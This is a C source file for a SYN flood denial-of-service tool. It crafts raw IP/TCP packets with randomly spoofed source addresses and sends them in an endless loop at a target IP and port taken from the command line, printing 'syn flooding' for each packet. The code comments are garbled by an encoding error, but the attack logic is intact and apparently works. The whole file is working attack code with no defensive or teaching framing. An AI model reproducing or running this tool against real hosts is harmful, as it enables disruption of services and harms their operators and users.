#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <arpa/inet.h>

struct tcphdr
{
    unsigned short sport;    // Դ�˿�
    unsigned short dport;    // Ŀ��˿�
    unsigned int seq;        // ���к�
    unsigned int ack_seq;    // ȷ�Ϻ�
    unsigned char len;       // �ײ�����
    unsigned char flag;      // ��־λ
    unsigned short win;      // ���ڴ�С
    unsigned short checksum; // У���
    unsigned short urg;      // ����ָ��
};

struct pseudohdr
{
    unsigned int saddr;
    unsigned int daddr;
    char zeros;
    char protocol;
    unsigned short length;
};

struct iphdr
{
    unsigned char ver_and_hdrlen; // �汾����IPͷ������
    unsigned char tos;            // ��������
    unsigned short total_len;     // �ܳ���
    unsigned short id;            // IP��ID
    unsigned short flags;         // ��־λ(������Ƭƫ����)
    unsigned char ttl;            // ��������
    unsigned char protocol;       // �ϲ�Э��
    unsigned short checksum;      // У���
    unsigned int srcaddr;         // ԴIP��ַ
    unsigned int dstaddr;         // Ŀ��IP��ַ
};

int sockfd;
int dst_port;
int interruption = 0;
char dst_ip[128];

unsigned short checksum(unsigned short *buffer, unsigned short size)
{

    unsigned long cksum = 0;

    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }

    if (size)
    {
        cksum += *(unsigned char *)buffer;
    }

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);

    return ((unsigned short)(~cksum));
}

void init_ip_header(struct iphdr *iphdr, unsigned int srcaddr, unsigned int dstaddr)
{
    int len = sizeof(struct iphdr) + sizeof(struct tcphdr);

    iphdr->ver_and_hdrlen = (4 << 4 | sizeof(struct iphdr) / sizeof(unsigned int));
    iphdr->tos = 0;
    iphdr->total_len = htons(len);
    iphdr->id = 1;
    iphdr->flags = 0x40;
    iphdr->ttl = 255;
    iphdr->protocol = IPPROTO_TCP;
    iphdr->checksum = 0;
    iphdr->srcaddr = srcaddr; // ԴIP��ַ
    iphdr->dstaddr = dstaddr; // Ŀ��IP��ַ
}

void init_tcp_header(struct tcphdr *tcp, unsigned short dport)
{
    tcp->sport = htons(8888);  // �������һ���˿�
    tcp->dport = htons(dport); // Ŀ��˿�
    tcp->seq = 0;              // �������һ����ʼ�����к�
    tcp->ack_seq = 0;
    tcp->len = (sizeof(struct tcphdr) / 4 << 4 | 0);
    tcp->flag = 0x02; // ����flagֵ�Ĵ�С��000010 = 0x02
    tcp->win = 0;
    tcp->checksum = 0;
    tcp->urg = 0;
}

void init_pseudo_header(struct pseudohdr *hdr, unsigned int srcaddr,
                        unsigned int dstaddr)
{
    hdr->zeros = 0;
    hdr->protocol = IPPROTO_TCP;
    hdr->length = htons(sizeof(struct tcphdr));
    hdr->saddr = srcaddr;
    hdr->daddr = dstaddr;
}

void synflood(struct sockaddr_in *addr)
{
    
    char buf[100];
    char sendbuf[1024];
    struct iphdr ip;         // IP ͷ��
    struct tcphdr tcp;       // TCP ͷ��
    struct pseudohdr pseudo; // TCP αͷ��

    while (interruption)
    {
        unsigned int saddr = rand(); // ���ԭIP��ַ
        int len = sizeof(ip) + sizeof(tcp);

        init_ip_header(&ip, saddr, inet_addr(dst_ip));
        init_tcp_header(&tcp, dst_port);
        init_pseudo_header(&pseudo, saddr, inet_addr(dst_ip));

        // ����IP��У���
        bzero(buf, sizeof(buf));
		memcpy(buf , &ip, sizeof(struct iphdr));
        ip.checksum = checksum((u_short *)buf, sizeof(struct iphdr));


        pseudo.saddr = ip.srcaddr;
        // ����TCPУ���
        bzero(buf, sizeof(buf));
        memcpy(buf, &pseudo, sizeof(pseudo));            // ����TCPαͷ��
        memcpy(buf + sizeof(pseudo), &tcp, sizeof(tcp)); // ����TCPͷ��
        tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp));

        bzero(sendbuf, sizeof(sendbuf));
        memcpy(sendbuf, &ip, sizeof(struct iphdr));
        memcpy(sendbuf + sizeof(struct iphdr), &tcp, sizeof(struct tcphdr));

        printf("%d:%d -attack-> %d:%d syn flooding\n", ip.srcaddr, tcp.sport, ip.dstaddr, dst_port);

        if (0 > sendto(sockfd, sendbuf, len, 0, (struct sockaddr *)addr, sizeof(struct sockaddr)))
        {
            perror("sendto Error!\n");
        }
    }
}

void sig_int(int signo)
{
    interruption = 0;
}

int main(int argc, char **argv)
{
    struct sockaddr_in addr;
    int on = 1;

    interruption = 1;
    signal(SIGINT, sig_int);

    if (argc < 2)
    {
        printf("usage: syn <target ip> <target port>\n");
        exit(1);
    }



    strncpy(dst_ip, argv[1], sizeof(dst_ip));
    dst_port = atoi(argv[2]);

    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(dst_port);

    int retval = inet_pton(AF_INET, argv[1], &addr.sin_addr);
    if (retval == -1 || retval == 0)
    {
        struct hostent *host = gethostbyname(argv[1]);
        if (host == NULL)
        {
            fprintf(stderr, "gethostbyname(%s):%s\n", argv[1], strerror(errno));
            exit(-1);
        }

        if (host->h_addr_list != NULL && *(host->h_addr_list) != NULL)
        {
            strncpy((char *)&addr.sin_addr, *(host->h_addr_list), 4);
            inet_ntop(AF_INET, *(host->h_addr_list), dst_ip, sizeof(dst_ip));
        }
    }
    else
    {
        strcpy(dst_ip, argv[1]);
    }

    // ����ԭʼ�׽���
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd == -1)
    {
        perror("socket()");
        return -1;
    }

    /* ����IPѡ�� */
    if (0 > setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)))
    {
        perror("setsockopt Error!\n");
        exit(1);
    }

    synflood(&addr);

    close(sockfd);

    return 0;
}